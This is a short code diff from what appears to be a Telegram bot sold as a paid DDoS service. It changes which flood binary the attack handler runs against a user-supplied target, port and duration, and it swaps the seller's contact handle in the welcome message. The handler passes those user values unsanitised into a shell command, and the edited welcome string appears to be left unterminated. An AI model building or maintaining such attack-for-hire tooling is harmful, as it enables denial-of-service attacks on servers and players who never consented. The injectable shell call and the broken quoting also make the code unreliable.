@@ -320,7 +320,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, 'FUCK', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./alone {target} {port} {time}"
+                full_command = f"./bgmi {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f" Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -383,7 +383,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @CRACKWAR0_FREE_USER_bot'''
+✅BUY :- @Nitin_510''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
